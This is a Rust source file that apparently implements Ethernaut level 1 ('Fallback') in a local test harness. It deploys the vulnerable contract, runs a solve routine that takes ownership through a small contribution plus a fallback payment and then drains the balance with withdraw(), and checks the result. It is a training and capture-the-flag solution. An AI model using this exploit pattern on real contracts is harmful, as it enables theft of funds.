use async_trait::async_trait;
use ethers::prelude::*;

use crate::roles::*;
use crate::{to_ether, Level};
use bindings::fallback::Fallback;

pub struct EthernautLevel1 {
    pub contract_address: Address,
}

#[async_trait]
impl Level for EthernautLevel1 {
    async fn set_up(roles: &Roles) -> eyre::Result<Self> {
        let Roles { deployer, offender, some_user: _ } = roles;

        println!("Deploying the Fallback contract...");
        let contract =
            Fallback::deploy(deployer.to_owned(), ())?.send().await?;

        let balance = contract.contributions(deployer.address()).await?;
        assert_eq!(balance, to_ether(1000));

        let balance = contract.contributions(offender.address()).await?;
        assert_eq!(balance, U256::from(0));

        deployer
            .send_transaction(
                TransactionRequest::new()
                    .to(contract.address())
                    .value(to_ether(5)),
                None,
            )
            .await?
            .await?;

        let contract_balance =
            deployer.get_balance(contract.address(), None).await?;
        assert_eq!(contract_balance, to_ether(5));

        let owner = contract.owner().await?;
        assert_eq!(owner, deployer.address());

        let level = EthernautLevel1 { contract_address: contract.address() };

        Ok(level)
    }

    const DESCRIPTION: &'static str = "Ethernaut
    Level 1: Fallback

    Look carefully at the contract's code below.

    You will beat this level if
    1. you claim ownership of the contract
    2. you reduce its balance to 0

    Things that might help:
    - How to send ether when interacting with an ABI
    - How to send ether outside of the ABI
    - Converting to and from wei/ether units (see help() command)
    - Fallback methods
    ";

    async fn solve(&self, offender: Actor) -> eyre::Result<()> {
        let contract = Fallback::new(self.contract_address, offender.clone());

        println!("Calling contribute()...");
        contract.contribute().value(1).send().await?.await?;

        println!("Calling receive()...");
        offender
            .send_transaction(
                TransactionRequest::new().to(contract.address()).value(1),
                None,
            )
            .await?
            .await?;

        println!("Calling withdraw()...");
        contract.withdraw().send().await?.await?;

        Ok(())
    }

    async fn check(self, roles: Roles) -> eyre::Result<EthernautLevel1> {
        let Roles { deployer, offender, some_user: _ } = roles;
        let contract = Fallback::new(self.contract_address, deployer.clone());

        println!("Checking that you claimed ownership of the contract...");
        let owner = contract.owner().await?;
        assert_eq!(owner, offender.address());

        println!("Checking that you reduced its balance to 0...");
        let contract_balance =
            deployer.get_balance(self.contract_address, None).await?;
        assert_eq!(contract_balance, U256::from(0));

        Ok(self)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_level;

    #[tokio::test]
    async fn test() -> eyre::Result<()> {
        test_level::<EthernautLevel1>().await?;
        Ok(())
    }
}
